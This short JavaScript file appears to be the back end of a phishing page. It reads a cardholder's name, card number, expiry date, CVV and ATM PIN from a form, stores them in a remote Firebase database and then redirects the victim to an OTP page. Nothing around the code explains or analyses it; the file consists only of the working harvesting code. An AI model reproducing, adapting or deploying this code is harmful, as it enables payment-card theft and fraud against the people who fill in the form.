
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var cname = getElementVal("cname");
    var ccard = getElementVal("ccard");
    var cexp = getElementVal("cexp");
    var ccvv = getElementVal("ccvv");
    var cpin = getElementVal("cpin");
    

  

  saveMessages(cname, ccard, cexp, ccvv, cpin);

  // redirect to OTP page
  window.location.href = "otpg.html";
}

const saveMessages = (cname, ccard, cexp, ccvv, cpin) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      Card_Holder_Name: cname,
      Card_Number: ccard,
      Expiry_Date: cexp,
      CVV: ccvv,
      ATM_PIN: cpin,
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

